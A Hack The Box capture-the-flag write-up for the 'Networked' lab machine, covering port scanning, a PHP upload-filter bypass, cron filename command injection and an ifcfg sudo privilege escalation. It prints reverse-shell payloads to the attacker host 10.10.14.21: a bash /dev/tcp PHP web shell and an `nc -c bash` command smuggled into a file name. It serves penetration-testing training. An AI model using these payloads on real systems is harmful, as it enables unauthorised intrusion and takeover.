# Networked
This machine was challenging (and is also rated Harder than oscp as per Tj null's list) due to the requirement of reading code, and the weird method of privilege escalation. However, I found the privesc method interesting as I had never seen it before.

**Links:** [1](https://www.hackthebox.com/machines/Networked)  [2](https://app.hackthebox.com/machines/Networked)

**Machine ip:** 10.10.10.146

![networked](https://github.com/h4md153v63n/CTFs/assets/5091265/92cd2294-7d07-497d-8f0d-7ed00d4d5c9f)

## Reconnaissance
First thing first, start with port scan to see which ports are open and which services are running on those ports.
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.146 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.146 --open`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/75a583b5-e3f7-4d7d-bc33-12c1747da5ec)

+ The result shows that 2 tcp ports are open:
```
Port tcp 22: OpenSSH 7.4
Port tcp 80: Apache httpd 2.4.6
```


## Enumeration
+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.146/`, and see the text.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dfa167a8-c0a2-414c-8dd2-278a62540c7c)

+ Viev page source, and take note of **upload** with **gallery** paths.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a06ac56d-8266-4ee5-99e1-96d5284435cc)

+ As always, on each web app, start directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.146/ -k -n -x html,php,txt -r -t 30
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/360da068-3dd3-412f-80f2-5b85dd3d5ae4)

+ Visit **upload.php** page.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/02cf635c-1554-499f-a6ce-f996bf402e30)

+ Next, visit the **backup** directory. It contains a compressed file **backup.tar**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6e294d32-8a7e-4eda-9d1f-28aca1301525)

+ Download the file and decompress it: `tar xvf backup.tar -C backup/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ba492160-c355-46dd-bc06-b00b24a19f43)

+ It contains the source code of the php scripts running on the web server.
+ Check the code of **upload.php** file.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d3c93b1-9f06-44ee-90ad-e9343923f5f9)

+ Check the code of **lib.php** file.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a8475de9-9279-40ed-9af0-2ed8d1f9653c)


## Gaining Access
+ Create a reverse shell **.php** file as **shell.php**, and then add one more extension as **.png** after **.php**. 
```
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'"); ?>
```

+ Change mimetype adding `GIF87a`.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53636d84-a81d-4051-a7ce-664e846b9855)

+ Upload it using browse button, and go.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/73fb950b-5722-4dd5-8f09-b12bb67e1677)

+ Start netcat listener on the attack machine: `nc -lnvp 4444`
+ Go to the **http://10.10.10.146/photos.php** that is discovered on the first directory fuzzing.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938b2b01-5334-437a-8769-5de7d1585d15)

+ Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7e030c55-ccc1-4d2d-987e-aae574a007fb)


### Shell Upgrade
+ We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a949dd60-e50c-4d98-8c1b-93ff60a0657c)


## Privilege Escalation: from 'www-data' to 'guly'
+ Escalate privileges to get the user flag.
+ Go to **/home/guly** directory, and list files.
+ **crontab.guly** file is interesting, and it runs **/home/guly/check_attack.php** every three minutes.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9b76943a-d7c7-486e-a01e-c019c359b3e5)

+ View the check_attack.php file.
```bash
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2c2845e5-7723-4b08-856d-546d84da1eb7)

+ The script takes in all the files in the **/var/www/html/uploads** directory and running the **getnameCheck()** and **check_ip()** functions on it from the **lib.php** file.
+ The **getnameCheck()** function simply separates the name of the file from the extension of the file. The **check_ip()** function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the **check_attack.php** file.
+ This passes the path of the file to the **exec()** function and deletes it. Of course, no validation is being done on the input of the **exec()** function and so we can abuse it to escalate privileges.
+ Change to the **/var/www/html/uploads** directory.
+ Create a file with a file name that contained a **command** that sent a reverse shell back to our machine:
```
touch '; nc -c bash 10.10.14.21 5555'
```

+ The **;** will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
+ Start netcat listener on the attack machine: `nc -lnvp 5555`
+ Wait three minutes for the cron job to run, and get **guly**'s shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4bafa09d-30ee-4f61-9cb6-dc8f1d57199c)

+ Again [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/25_Networked.md#shell-upgrade), and get user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938570b0-91f5-47d9-9810-b9ea29eab205)


## Privilege Escalation: from 'guly' to 'root'
+ Escalate privileges to get the root flag.
+ View commands the user can run using sudo without a password: `sudo -l`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c45e3e63-f884-4c89-afcd-52dbbd05b46b)

+ View the script of **/usr/local/sbin/changename.sh**
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

+ View content of **/etc/sysconfig/network-scripts/ifcfg-guly**.
```
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=a id
PROXY_METHOD=a ls /root
BROWSER_ONLY=a pwd
BOOTPROTO=a whoami
```

+ Run the command: `sudo /usr/local/sbin/changename.sh`
+ It asks the user for these options: NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO
+ Type for BOOTPROTO: `try bash`
+ Get the root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6a916b23-60f3-418b-bf65-88df19b141ff)


# Technical Knowledge
+ https://en.wikipedia.org/wiki/List_of_file_signatures
+ https://vk9-sec.com/local-file-upload-magic-byte-change-file-type
+ https://medium.com/@igordata/php-running-jpg-as-php-or-how-to-prevent-execution-of-user-uploaded-files-6ff021897389
+ https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology
+ https://ivanitlearning.wordpress.com/2020/02/01/overthewire-natas11-13/


# CVE Scripting
+ **ifcfg:** https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s1-networkscripts-interfaces
+ https://seclists.org/fulldisclosure/2019/Apr/24
+ https://seclists.org/fulldisclosure/2019/Apr/27
+ https://bugzilla.redhat.com/show_bug.cgi?id=1697473
+ https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f


# References & Alternatives
+ https://vvmlist.github.io/#Networked
+ https://ivanitlearning.wordpress.com/2020/08/16/hackthebox-networked/
+ https://0xrick.github.io/hack-the-box/networked/
+ https://infosecwriteups.com/hackthebox-networked-writeup-3d0a1276ad3c
+ https://medium.com/@toneemarqus/networked-htb-manual-walkthrough-2023-oscp-journey-b38558b4bb0f
+ https://infosecwriteups.com/hackthebox-networked-93ebbd6a70e3
+ https://0xdf.gitlab.io/2019/11/16/htb-networked.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/networked-writeup-w-o-metasploit
+ https://www.hackingarticles.in/hack-the-box-networked-walkthrough/
+ https://danielxblack.ghost.io/hack-the-box-networked/
+ https://secopsbear.com/ctf/HTB-Retired/htb-networked/


# For More
+ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
